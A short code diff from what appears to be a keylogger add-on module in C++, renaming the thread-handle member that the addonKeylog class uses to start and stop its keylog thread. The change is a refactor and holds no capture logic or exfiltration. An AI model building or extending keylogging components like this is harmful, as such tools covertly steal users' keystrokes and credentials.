@@ -19,7 +19,7 @@ addonKeylog::addonKeylog()
 {
 	this->keylog_active = true;
 
-	this->keylogThread = gThread->Start((LPTHREAD_START_ROUTINE)keylog_thread);
+	this->keylogHandle = gThread->Start((LPTHREAD_START_ROUTINE)keylog_thread);
 }
 
 
@@ -28,7 +28,7 @@ addonKeylog::~addonKeylog()
 {
 	this->keylog_active = false;
 
-	gThread->Stop(this->keylogThread);
+	gThread->Stop(this->keylogHandle);
 }
 
 
